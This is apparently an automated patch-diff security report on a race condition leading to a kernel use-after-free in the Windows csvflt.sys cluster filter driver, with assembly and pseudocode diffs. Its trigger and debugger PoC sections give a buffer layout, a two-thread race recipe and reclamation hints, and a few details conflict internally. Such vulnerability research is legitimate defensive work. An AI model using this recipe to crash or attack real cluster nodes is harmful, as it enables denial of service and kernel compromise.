Title: csvflt.sys — Race Condition (CWE-362) leading to Use-After-Free (CWE-416) in CsvCamSetSecurityInfo fixed
Date: 2026-06-28
Slug: csvflt_fbd25564-csvflt-report-20260628-225541
Category: Corpus
Author: Argus
Summary: KB5078752
Severity: High
KBDate: 2026-03-10

## 1. Overview

| Item | Value |
|---|---|
| Unpatched binary | `csvflt_unpatched.sys` |
| Patched binary | `csvflt_patched.sys` |
| Overall similarity | 0.9914 |
| Matched functions | 536 |
| Changed functions | 1 |
| Identical functions | 535 |
| Unmatched (each side) | 0 |

**Verdict:** The patch is a one-function surgical fix to a TOCTOU race condition in `csvflt!CsvCamSetSecurityInfo (sub_1C0039E30)` that yields a PagedPool Use-After-Free on the global `EncryptionManager` signing-context pointer. The race is reachable from a caller that can open the `\Csv2_FilterPort` minifilter communication port and send concurrent command-code-1 messages, making it a locally-triggerable kernel-mode memory-corruption bug (dangling-pointer dereference) on Windows Server Failover Clustering nodes with Cluster Shared Volumes enabled. The impact demonstrable from these two binaries is kernel pool corruption / denial of service; a full privilege-escalation chain is not evidenced by the binaries.

---

## 2. Vulnerability Summary

### Finding #1 — TOCTOU → UAF on cached signing-context global

- **Severity:** High
- **Class:** Race condition (CWE-362) leading to Use-After-Free (CWE-416)
- **Affected function:** `csvflt_unpatched!CsvCamSetSecurityInfo (sub_1C0039E30)` (entry RVA `0x39e30`)
- **Pool object:** PagedPool, **0x28 bytes**, tag **`CVCA`**

#### Root cause

`CsvCamSetSecurityInfo (sub_1C0039E30)` handles a CSV CAM set-security-info message. It maintains a driver-global pointer, `EncryptionManager (data_1c002f518)`, pointing to an `Encryption` signing-context object (a small `0x28`-byte PagedPool allocation, tag `CVCA`).

In the **unpatched** binary, the function reads this global pointer at `0x1c0039e61` *without holding any lock*, then immediately dereferences fields `+0x20` (`0x1c0039e70`) and `+0x18` (`0x1c0039e77`) of the object it points to.

Elsewhere in the **same function**, on the cache-stale path, the code acquires an `ERESOURCE` exclusive lock (`ExAcquireResourceExclusiveLite` at `0x1c0039f6c`), frees the old cached object via `Encryption::scalar_deleting_destructor (sub_1c0027c28)` → `ExFreePoolWithTag` (`0x1c0039f84`), and overwrites the global with a newly allocated object at `0x1c0039f90`.

Because the **read-and-dereference** path does not share the same lock as the **free-and-replace** path, two concurrent invocations of `CsvCamSetSecurityInfo (sub_1C0039E30)` can interleave such that:

1. Thread A reads `EncryptionManager (data_1c002f518)` at `0x1c0039e61`.
2. Thread B acquires the exclusive lock, frees the object Thread A just read a pointer to, and swaps in a fresh allocation.
3. Thread A dereferences the now-dangling pointer at `0x1c0039e70`/`0x1c0039e77` — **Use-After-Free**.

The **patch** wraps the read of the global inside `RWLock::AcquireShared (sub_1c0027d70)` (acquire) / `RWLock::ReleaseShared (sub_1c00289ec)` (release) calls on the SAME `SigningLock` reader-writer lock that the free+replace path already held exclusively (`SigningLock (data_1c002f530)` unpatched, relocated to `SigningLock (data_1c002f560)` patched). Readers now take it in shared mode while the writer takes it exclusive; no new lock object was introduced, and the acquire is unconditional (no feature gate, no old path retained). The entry guard is recompiled from `mov eax,[rcx+0xd4]; test eax, eax; je` to `cmp dword [rcx+0xd4], ebp; jbe` (`ebp = 0`); because `jbe` against zero is an unsigned "below-or-equal zero", both forms branch away only when the length is exactly zero, so this is an equivalent non-zero check (a codegen difference), not a stricter bound. The second global `ReplayCacheManagerObject (data_1c002f508)` / `ReplayCacheManagerObject (data_1c002f0b8)` was already read under a shared lock in the unpatched build (`ExAcquireResourceSharedLite` at `0x1c0039fca`); the patch only re-expresses that same shared acquire through the `RWLock::AcquireShared` / `RWLock::ReleaseShared` wrapper, which is a refactor rather than a security change. Only the first global (`EncryptionManager`) was read with no lock in the unpatched build, and it is the sole security-relevant change.

#### Entry point & data flow

Attacker-reachable via the minifilter user-mode communication API:

1. `FilterConnectCommunicationPort(L"\\Csv2_FilterPort", ...)` — connect to the filter port. The connect-notify callback (`CsvConnect (sub_1c0038160)`) accepts a connection context whose first DWORD is `1` or `2` (client type) and size ≥ 8 bytes.
2. `FilterSendMessage(port, buf, sizeof(buf) ≥ 0xDC, ...)` — issue a command-code-1 message.
3. `DriverEntry (sub_1c003b078)` (DriverEntry) registered the port via `FltCreateCommunicationPort`; the message callback is `CsvMessage (sub_1c0038460)`.
4. `CsvMessage (sub_1c0038460)` copies the input into a pool buffer and reads its first DWORD as the command code; when it equals `1` and the input length is `≥ 0xDC`, it dispatches to `CsvCamSetSecurityInfo (sub_1C0039E30)(buf)`.
5. `CsvCamSetSecurityInfo (sub_1C0039E30)` reads `buf+0xd4` (length), then reads global `EncryptionManager (data_1c002f518)` **unlocked** and dereferences it.
6. A concurrent `FilterSendMessage` invocation on a sibling thread takes the cache-stale path: it acquires the `ERESOURCE`, frees the old object, and swaps in a new one.
7. First thread dereferences the freed object — UAF.

---

## 3. Pseudocode Diff

### Unpatched (vulnerable)

```c
NTSTATUS CsvCamSetSecurityInfo (sub_1C0039E30)(MessageCtx* arg1) {
    int32_t len = arg1->length;          // [arg1+0xd4]
    bool    ok = false;

    if (len != 0) {                      // 0x1c0039e59 — non-zero check
        ok = true;

        // ============ VULNERABLE: NO LOCK HELD ============
        CachedCtx* ctx = EncryptionManager (data_1c002f518); // 0x1c0039e61 — unlocked read
        if (ctx != NULL) {
            if (ctx->length == len) {    // 0x1c0039e70 — DEREF #1 (UAF)
                // ctx->data_ptr is then passed to a copy/compare:
                if (memcmp (sub_1c0008940)(&arg1->inline_data,   // [arg1+0xd8]
                                  ctx->data_ptr,         // 0x1c0039e77 — DEREF #2 (UAF)
                                  len) != 0) {
                    ok = false;
                }
            } else {
                ok = false;
            }
        } else {
            // ---- cache-miss: alloc + free + replace ----
            CachedCtx* newctx = ExAllocatePoolWithTag(
                PagedPool, 0x28, 'CVCA');         // 0x1c0039ef5
            if (!newctx) return STATUS_INSUFFICIENT_RESOURCES;
            Encryption::Initialize (sub_1c0028308)(newctx, &arg1->inline_data, len);
            // ...
            KeEnterCriticalRegion();              // 0x1c0039f5b
            ExAcquireResourceExclusiveLite(       // 0x1c0039f6c
                *SigningLock (data_1c002f530), TRUE);

            CachedCtx* old = EncryptionManager (data_1c002f518);      // 0x1c0039f78
            if (old) Encryption::scalar_deleting_destructor (sub_1c0027c28)(old);          // 0x1c0039f84 — FREE OLD
            EncryptionManager (data_1c002f518) = newctx;              // 0x1c0039f90 — REPLACE

            ExReleaseResourceLite(*SigningLock (data_1c002f530));
            KeLeaveCriticalRegion();
        }
    }
    // ... second global access under shared lock follows ...
    return ok ? 0 : <status>;
}
```

### Patched (fixed)

```c
NTSTATUS CsvCamSetSecurityInfo (sub_1C0039E30)(MessageCtx* arg1) {
    int32_t len = arg1->length;          // [arg1+0xd4]
    bool    ok = false;

    if (len != 0) {                      // 0x1c0039e53 cmp / 0x1c0039e59 jbe — equivalent non-zero check
        ok = true;

        // ==== ACQUIRE SigningLock SHARED (same lock the writer takes exclusive) ====
        RWLock::AcquireShared (sub_1c0027d70)(SigningLock (data_1c002f560));   // 0x1c0039e5f load / 0x1c0039e69 — ACQUIRE SHARED

        CachedCtx* ctx = EncryptionManager (data_1c002f0c0); // 0x1c0039e6e — read UNDER LOCK
        if (ctx != NULL) {
            if (ctx->length == len) {    // 0x1c0039e7a — safe deref
                if (memcmp (sub_1c0008940)(&arg1->inline_data,
                                  ctx->data_ptr,   // safe deref
                                  len) != 0) {
                    ok = false;
                }
            } else {
                ok = false;
            }
        }

        RWLock::ReleaseShared (sub_1c00289ec)(SigningLock (data_1c002f560));   // 0x1c0039ef9 — RELEASE SHARED

        // cache-miss alloc + Encryption::Initialize then free+replace run AFTER the
        // shared release, under the exclusive ERESOURCE at 0x1c0039f74 (unchanged)
    }
    return ok ? 0 : <status>;
}
```

The two changes worth highlighting:

- **0x1c0039e61** (unpatched): `mov rdx, [rel 0x1c002f518]` reads the global with no lock.
- **0x1c0039e69** (patched): `call RWLock::AcquireShared (sub_1c0027d70)` takes `SigningLock` shared *before* the global read at `0x1c0039e6e`.

---

## 4. Assembly Analysis

### Unpatched — vulnerable block (read + deref with no lock)

```asm
; ---- entry / guard ----
0x1c0039e48: mov  eax, dword [rcx+0xd4]    ; arg1+0xd4 = attacker length
0x1c0039e4e: xor  ebp, ebp
0x1c0039e50: xor  r14b, r14b
0x1c0039e53: mov  rsi, rcx                  ; rsi = arg1 (msg buffer)
0x1c0039e56: mov  r15b, 0x1
0x1c0039e59: test eax, eax                  ; len != 0 ?
0x1c0039e5b: je   0x1c0039fb2               ; (patched: cmp [rcx+0xd4],ebp ; jbe ...)

; ---- VULNERABLE: unlocked read ----
0x1c0039e61: mov  rdx, qword [rel 0x1c002f518]   ; <-- TOCTOU window start
0x1c0039e68: mov  r14b, r15b
0x1c0039e6b: test rdx, rdx
0x1c0039e6e: je   0x1c0039ee7               ; cache miss -> alloc path

; ---- VULNERABLE: deref without lock ----
0x1c0039e70: mov  ecx, dword [rdx+0x20]     ; <-- UAF #1: cached->length
0x1c0039e73: cmp  eax, ecx
0x1c0039e75: jne  0x1c0039ebe
0x1c0039e77: mov  rdx, qword [rdx+0x18]     ; <-- UAF #2: cached->data_ptr
0x1c0039e7b: mov  r8d, ecx
0x1c0039e7e: lea  rcx, [rsi+0xd8]
0x1c0039e85: call 0x1c0008940               ; memcmp (sub_1c0008940)(dst, src, len)
```

### Unpatched — concurrent free + replace path (lock held here)

```asm
; ---- allocate new 0x28-byte CVCA object ----
0x1c0039ee7: mov  edx, 0x28                 ; size
0x1c0039eec: mov  r8d, 0x41435643           ; 'CVCA'
0x1c0039ef2: lea  ecx, [rdx-0x27]           ; PoolType = 1 (PagedPool)
0x1c0039ef5: call qword [rel 0x1c0032608]   ; ExAllocatePoolWithTag
0x1c0039f01: mov  rdi, rax                  ; rdi = new alloc
...
0x1c0039f2e: mov  r8d, dword [rsi+0xd4]     ; len
0x1c0039f35: lea  rdx, [rsi+0xd8]           ; source inline data
0x1c0039f3c: mov  rcx, rdi                  ; new object
0x1c0039f3f: call 0x1c0028308               ; copy-init helper
0x1c0039f44: mov  ebp, eax
0x1c0039f46: test eax, eax
0x1c0039f48: jns  0x1c0039f54               ; success -> swap
0x1c0039f4a: mov  rcx, rdi
0x1c0039f4d: call 0x1c0027c28               ; free on copy failure
0x1c0039f52: jmp  0x1c0039fb2

; ---- free + swap under ERESOURCE exclusive ----
0x1c0039f54: mov  rbx, qword [rel 0x1c002f530]   ; ERESOURCE global
0x1c0039f5b: call qword [rel 0x1c0032568]        ; KeEnterCriticalRegion
0x1c0039f67: mov  rcx, qword [rbx]
0x1c0039f6a: mov  dl, 0x1
0x1c0039f6c: call qword [rel 0x1c00322c8]        ; ExAcquireResourceExclusiveLite
0x1c0039f78: mov  rcx, qword [rel 0x1c002f518]   ; read old pointer
0x1c0039f7f: test rcx, rcx
0x1c0039f82: je   0x1c0039f89
0x1c0039f84: call 0x1c0027c28                    ; <-- ExFreePoolWithTag(old)
0x1c0039f89: mov  rcx, qword [rel 0x1c002f530]
0x1c0039f90: mov  qword [rel 0x1c002f518], rdi    ; EncryptionManager (data_1c002f518) = new alloc
0x1c0039f97: mov  rcx, qword [rcx]
0x1c0039f9a: call qword [rel 0x1c00322e8]         ; ExReleaseResourceLite
0x1c0039fa6: call qword [rel 0x1c0032560]         ; KeLeaveCriticalRegion
```

### Patched — same block wrapped in lock

```asm
0x1c0039e53: cmp  dword [rcx+0xd4], ebp          ; ebp=0; len == 0 ?
0x1c0039e59: jbe  0x1c0039fd2                    ; skip only when len == 0 (same as unpatched test/jz)

0x1c0039e5f: mov  rcx, qword [rel SigningLock]   ; SigningLock (data_1c002f560)
0x1c0039e69: call 0x1c0027d70                    ; <-- ACQUIRE SHARED (RWLock::AcquireShared)
0x1c0039e6e: mov  rdx, qword [rel EncryptionManager] ; read global UNDER LOCK (data_1c002f0c0)
0x1c0039e75: test rdx, rdx
0x1c0039e78: je   0x1c0039ef2
0x1c0039e7a: mov  eax, dword [rdx+0x20]          ; safe deref
0x1c0039e7d: cmp  dword [rsi+0xd4], eax
0x1c0039e83: jne  0x1c0039ec9
0x1c0039e85: mov  rdx, qword [rdx+0x18]          ; safe deref
0x1c0039e89: lea  rcx, [rsi+0xd8]
0x1c0039e90: mov  r8d, eax
0x1c0039e93: call 0x1c0008940                    ; memcmp
...
0x1c0039ef2: mov  rcx, qword [rel SigningLock]
0x1c0039ef9: call 0x1c00289ec                    ; <-- RELEASE SHARED (RWLock::ReleaseShared)
```

The key shift: the unlocked read at `0x1c0039e61` in the unpatched binary becomes a shared-lock acquire (`call RWLock::AcquireShared (sub_1c0027d70)` on `SigningLock`) in the patched binary, and only then is the global pointer read.

---

## 5. Trigger Conditions

1. **Target environment.** The host must be running `csvflt.sys` — present on Windows Server Failover Clustering nodes with Cluster Shared Volumes enabled. The minifilter port `\Csv2_FilterPort` is created in `DriverEntry` (`DriverEntry (sub_1c003b078)`) at runtime.

2. **Open a port handle.** From a user-mode process running at any privilege that can open the port:
   - Call `FilterConnectCommunicationPort(L"\\Csv2_FilterPort", ...)`.
   - The connect buffer's first DWORD must be `1` or `2` (client type); buffer length must be ≥ 8 bytes (validated by the connect-notify callback `CsvConnect (sub_1c0038160)`).

3. **Build the message buffer (≥ `0xDC` bytes).**

   | Offset | Size | Field | Required value |
   |---|---|---|---|
   | `+0x00` | `DWORD` | command code | `1` (routes to `CsvCamSetSecurityInfo (sub_1C0039E30)`) |
   | `+0xcc` | `DWORD` | connection ID | any value that matches the connection the server expects |
   | `+0xd0` | `DWORD` | sequence / flags | any |
   | `+0xd4` | `DWORD` | length | **non-zero**; alternate between two distinct values to force cache invalidation |
   | `+0xd8` | `DWORD[]` | inline data | source data copied into the cached object |

4. **Create the race.** Spawn two (or more) threads, each with its own port handle:
   - **Thread A (reader):** Sends a message whose `+0xd4` length **matches** the currently cached length. It enters the unlocked read-deref path (`0x1c0039e61 → 0x1c0039e70 → 0x1c0039e77`).
   - **Thread B (freer):** Sends a message whose `+0xd4` length **differs** from the cached length. It enters the cache-stale path, allocates a new `0x28`-byte `CVCA` object, frees the old one under the `ERESOURCE`, and swaps in the new pointer.

5. **Win the race.** Thread A's read at `0x1c0039e61` must occur *before* Thread B's `ExFreePoolWithTag` at `0x1c0039f84`, and Thread A's deref at `0x1c0039e70`/`0x1c0039e77` must occur *after* it. The race window is a handful of instructions — about `0x10` bytes of code. Repeated concurrent calls (typically thousands of rounds) are needed for a deterministic PoC; CPU pinning of the two threads to different cores widens the window.

6. **Observable confirmation.**
   - With Driver Verifier Special Pool enabled on `csvflt.sys`, the dangling read at `0x1c0039e70`/`0x1c0039e77` faults on the freed guard page, typically BUGCHECK `0x50` (`PAGE_FAULT_IN_NONPAGED_AREA`) with the faulting instruction at `csvflt+0x39e70`.
   - Without Special Pool, if the pool page was fully released the deref may still fault with BUGCHECK `0x50`; if the block was recycled, the deref reads whatever now occupies the slot and the two field reads (`+0x20`, `+0x18`) flow into `memcmp (sub_1c0008940)`.

---

## 6. Exploit Primitive & Development Notes

### Primitive

A **dangling PagedPool pointer dereference** on a `0x28`-byte `CVCA`-tagged allocation. After Thread B frees the object, the freed slot may be recycled before Thread A's deref, and the two fields Thread A reads are:

- `+0x20` (32-bit length) — compared against the attacker's `arg1+0xd4`.
- `+0x18` (data pointer) — passed as the `Buf2` (source) argument to `memcmp (sub_1c0008940)`, compared against `arg1+0xd8` for `+0x20` bytes.

### Limits of the primitive

The value returned to the caller through `memcmp (sub_1c0008940)` is used only as a match/no-match boolean: on mismatch the function clears its `ok` flag (`r14b`) and takes a WPP trace branch. It is **not** a data-return channel — the bytes read from `+0x18` are never copied back to the caller, only compared. The binaries therefore demonstrate a **use-after-free / pool-corruption** condition (dangling read of freed pool, and a stale pointer used as a `memcmp` source). They do **not** demonstrate a controlled kernel-read/info-leak oracle, KASLR defeat, or a token-theft/code-execution chain; any such escalation would require additional primitives that are not present in or evidenced by these binaries. The confirmed, reachable impact is kernel memory corruption leading to denial of service (bugcheck), with the usual caveat that a UAF of this shape can, in principle, be developed further by a researcher who supplies their own reclamation and control primitives.

---

## 7. Debugger PoC Playbook

This section assumes WinDbg/KD attached to the **unpatched** `csvflt.sys`, kernel-mode, with symbols loaded (or at least the raw addresses below).

### Breakpoints

Paste these into the debugger. Adjust the module prefix to whatever `lm t n` reports for the CSV filter (typically `csvflt`).

```text
; Function entry — confirm arg1 layout
bp csvflt+0x39e30 ".printf \"CsvCamSetSecurityInfo (sub_1C0039E30) entry rcx=%p len=%d connID=%d\\n\", rcx, poi(rcx+0xd4), poi(rcx+0xcc);g"

; UNLOCKED read of the global — TOCTOU window START
bp csvflt+0x39e61 ".printf \"[UNLOCKED READ] EncryptionManager (data_1c002f518)=%p\\n\", poi(csvflt+0x2f518); rdx"

; UAF deref #1: cached->length
bp csvflt+0x39e70 ".printf \"[DEREF +0x20] rdx=%p  *(rdx+0x20)=%p\\n\", rdx, poi(rdx+0x20); !pool rdx 2"

; UAF deref #2: cached->data_ptr
bp csvflt+0x39e77 ".printf \"[DEREF +0x18] rdx=%p  *(rdx+0x18)=%p\\n\", rdx, poi(rdx+0x18)"

; Free path entry (lock acquire)
bp csvflt+0x39f54 ".printf \"[FREE-PATH] acquiring ERESOURCE=%p\\n\", poi(csvflt+0x2f530)"

; The actual ExFreePoolWithTag on the cached object
bp csvflt+0x39f84 ".printf \"[FREE] rcx=%p (about to free CVCA)\\n\", rcx; kv"
```

A conditional breakpoint on the entry to capture only the vulnerable path:

```text
bp csvflt+0x39e30 ".if (poi(rcx+0xd4) != 0) {.echo ENTERED VULN PATH} .else {gc}"
```

### What to inspect at each breakpoint

| BP | Register | What it tells you |
|---|---|---|
| `csvflt+0x39e30` | `rcx` | Arg1 — the message buffer. `poi(rcx+0x0)` = command code (must be 1). `poi(rcx+0xcc)` = conn ID. `poi(rcx+0xd0)` = sequence/flags. `poi(rcx+0xd4)` = length (must be non-zero). `rcx+0xd8` = start of inline data. |
| `csvflt+0x39e61` | `rdx` (after `mov`) | The pointer just read from the global. Save this value — it is the candidate dangling pointer. |
| `csvflt+0x39e70` | `rdx` | Still the same pointer. `!pool rdx 2` should show it; after the race you should see it as `Free` if Special Pool is on, or unexpectedly *different* tag if reclaimed by attacker spray. |
| `csvflt+0x39f84` | `rcx` | The object being freed. **Compare this value to the `rdx` value captured at `+0x39e61`** — if they match and `+0x39e70` is still in flight on another thread, the UAF has fired. |

### Key instructions / offsets

```text
csvflt+0x39e48 : mov  eax, [rcx+0xd4]      ; reads attacker length
csvflt+0x39e59 : test eax, eax             ; UNPATCHED guard (non-zero)
csvflt+0x39e61 : mov  rdx, [csvflt+0x2f518]; *** UNLOCKED GLOBAL READ ***
csvflt+0x39e70 : mov  ecx, [rdx+0x20]      ; *** UAF DEREF #1 ***
csvflt+0x39e77 : mov  rdx, [rdx+0x18]      ; *** UAF DEREF #2 ***
csvflt+0x39f54 : (ERESOURCE acquire)       ; lock the free path SHOULD have used
csvflt+0x39f84 : call Encryption::scalar_deleting_destructor (sub_1c0027c28)        ; ExFreePoolWithTag on old object
csvflt+0x39f90 : mov  [csvflt+0x2f518], rdi; replace global with new alloc
```

The corresponding *patched* instructions to compare (the function was recompiled, so the offsets shifted):

```text
csvflt+0x39e53 : cmp  [rcx+0xd4], ebp      ; PATCHED guard (equivalent non-zero check)
csvflt+0x39e59 : jbe  csvflt+0x39fd2       ; skip only when len == 0
csvflt+0x39e5f : mov  rcx, [csvflt+0x2f560]; load lock object (SigningLock)
csvflt+0x39e69 : call RWLock::AcquireShared (sub_1c0027d70)        ; ACQUIRE LOCK
csvflt+0x39e6e : mov  rdx, [csvflt+0x2f0c0]; read global UNDER LOCK
csvflt+0x39ef9 : call RWLock::ReleaseShared (sub_1c00289ec)        ; RELEASE LOCK
```

### Trigger setup from user mode

```text
1. Target: csvflt.sys must be loaded (CSV feature enabled).
2. hPort = FilterConnectCommunicationPort(L"\\Csv2_FilterPort", 0,
              connectBuf /* DWORD[0]=1 */, 8, NULL, &hPort);
3. Build message buffer Msg[>= 0xDC]:
       Msg[0x00]  = 1            ; command code
       Msg[0xcc]  = <conn_id>    ; same conn ID you used at connect
       Msg[0xd0]  = 0            ; sequence
       Msg[0xd4]  = 0x40         ; length (alternate 0x40 / 0x80 between threads)
       memcpy(&Msg[0xd8], sprayData, 0x40);
4. Thread A loops: FilterSendMessage(hPortA, Msg, sizeof(Msg), &reply, &replyLen);
   Thread B loops: same call, hPortB, Msg with DIFFERENT +0xd4 length.
5. Enable Special Pool on csvflt.sys in Driver Verifier for crash visibility.
```

### Expected observation

With Special Pool on, the dangling read faults on the freed guard page:

```text
BUGCHECK 0x50 (PAGE_FAULT_IN_NONPAGED_AREA)
   Faulting IP  : csvflt+0x39e70
   Faulting addr: <old rdx + 0x20>
```

Without Special Pool, run `!pool rdx 2` at the `+0x39e70` breakpoint — if it shows `Free` or a *different* tag (reclaimed), the UAF has occurred. With attacker reclamation, `poi(rdx+0x18)` will be the attacker-controlled fake data pointer.

### Struct layout reference

**Cached CVCA object (0x28 bytes, PagedPool, tag `'CVCA'`):**

| Offset | Size | Field |
|---|---|---|
| `+0x00` | 8 | zeroed on alloc (state/refcount) |
| `+0x08` | 8 | zeroed on alloc |
| `+0x10` | 8 | zeroed on alloc |
| `+0x18` | 8 | **data pointer** (passed to `memcmp (sub_1c0008940)` as source) — UAF target #2 |
| `+0x20` | 4 | **length** (compared to `arg1+0xd4`) — UAF target #1 |
| `+0x24` | 4 | (padding / unused) |

**Message buffer (`arg1`, command code 1, min `0xDC`):**

| Offset | Size | Field |
|---|---|---|
| `+0x00` | 4 | command code (must be `1`) |
| `+0xcc` | 4 | connection ID |
| `+0xd0` | 4 | sequence / flags |
| `+0xd4` | 4 | length (must be `> 0`; alternate values to force free) |
| `+0xd8` | N | inline data copied into the cached object |

**Globals:**

| Symbol (unpatched) | Type | Purpose |
|---|---|---|
| `EncryptionManager (data_1c002f518)` | `Encryption*` | signing-context pointer (the 0x28-byte object raced on) |
| `SigningLock (data_1c002f530)` | `RWLock*` (wraps `ERESOURCE`) | taken exclusive by the free+replace path; unpatched read path took it not at all |
| `ReplayCacheManagerObject (data_1c002f508)` | `void*` | second global, read under shared lock (also hardened by patch) |
| `SigningLock (data_1c002f560)` | `RWLock*` | same `SigningLock` at the relocated patched address; reads now take it shared |

---

## 8. Changed Functions — Full Triage

Only one function differs between the two binaries.

| Function | Similarity | Change type | Notes |
|---|---|---|---|
| `CsvCamSetSecurityInfo (sub_1C0039E30)` | 0.9634 | security_relevant | Replaced the unlocked read+deref of the `EncryptionManager` global with a `RWLock::AcquireShared (sub_1c0027d70)` / `RWLock::ReleaseShared (sub_1c00289ec)` wrapped sequence. The read path now takes `SigningLock` in shared mode before dereferencing the global; the alloc/free/replace path still takes the same `SigningLock` exclusive. Making readers take the reader-writer lock shared to match the exclusive writer closes the TOCTOU. The entry guard was recompiled from `test eax, eax; je` to `cmp dword [rcx+0xd4], ebp; jbe`, which is the same non-zero test (not a stricter check). The second global (`ReplayCacheManager`) read was already shared-locked in the unpatched build and was only re-expressed through the same `RWLock` wrapper (a refactor). |

Inside the same function, the copy-init helper `Encryption::Initialize (sub_1c0028308)` (unpatched) is replaced by `Encryption::Initialize (sub_1c002833c)` (patched) — a register-allocation-recompiled copy of the same logic with no behavioral security impact. No cosmetic-only register changes were noted elsewhere; the other 535 matched functions are byte-identical.

---

## 9. Unmatched Functions

None. Neither the unpatched nor the patched binary contains functions that have no counterpart in the other. The patch is purely an intra-function refactor inside `CsvCamSetSecurityInfo (sub_1C0039E30)`; no sanitizers were removed. The patch adds shared-mode `RWLock::AcquireShared (sub_1c0027d70)` / `RWLock::ReleaseShared (sub_1c00289ec)` calls on the existing `SigningLock` around the read path; the exclusive writer path was already present in the unpatched binary.

---

## 10. Confidence & Caveats

**Confidence:** High for the existence of the race / UAF and its location. Medium for the exact exploitability and call-chain reachability.

**Rationale:**

- The assembly diff is unambiguous: the unlocked read at `0x1c0039e61` is the only meaningful behavioral change. The patched binary introduces a lock acquire/release pair around the read, and the free path is unchanged in semantics — only the lock guard changed. This is a textbook TOCTOU.
- The pool size (0x28), tag (`CVCA`), and PagedPool type are directly evidenced by the `ExAllocatePoolWithTag` arguments at `0x1c0039ee7-0x1c0039ef5`.
- The dispatch is confirmed in `CsvMessage (sub_1c0038460)`: it copies the input into a pool buffer, reads the first DWORD as the command code, and for command code `1` with input length `>= 0xDC` calls `CsvCamSetSecurityInfo (sub_1C0039E30)`. `CsvConnect (sub_1c0038160)` gates connection only by client type (first context DWORD must be `1` or `2`, context size `>= 8`) and allows a single connection of each type. The open question for reachability is the **port ACL**: `FltCreateCommunicationPort` is called with a NULL `SecurityDescriptor` in the `OBJECT_ATTRIBUTES` (no `FltBuildDefaultSecurityDescriptor` call is present), so the effective access is whatever default the filter manager applies. A researcher should confirm:
  1. Whether a non-admin user can open `\Csv2_FilterPort` on a default cluster node given that default descriptor.
  2. That `+0xcc` (connection ID) and `+0xd0` (sequence) do not need to match a server-side session table to reach the vulnerable path (they feed the second-global `ReplayCacheManager` path, not the first-global read).
  3. That `memcmp (sub_1c0008940)` does not itself hold any lock that would shrink the race window further.

**Other assumptions:**

- `RWLock::AcquireShared (sub_1c0027d70)` / `RWLock::ReleaseShared (sub_1c00289ec)` are symbol-resolved shared acquire/release on the existing `SigningLock (data_1c002f560)` reader-writer lock; this is the same `SigningLock` the exclusive writer path uses, not a new lock object.
- No reclamation/spray primitive for the `0x28`-byte PagedPool slot was identified or validated in these binaries; the report claims only the use-after-free itself, not a working reclamation.

**What to verify manually before writing a PoC:**

- Reproduce the assembly offsets against the actual loaded base address (`u csvflt!CsvCamSetSecurityInfo (sub_1C0039E30)`).
- Confirm port accessibility under a non-admin token.
- Confirm the message-format fields (especially `+0xcc` connection ID) — best done by attaching to a live cluster node and watching a legitimate CSV client connect.
- Validate the reclaim object size against the current kernel build (pool header accounting varies between Windows versions).
- Test with Driver Verifier Special Pool first to make the race crash deterministically before attempting silent reclamation.
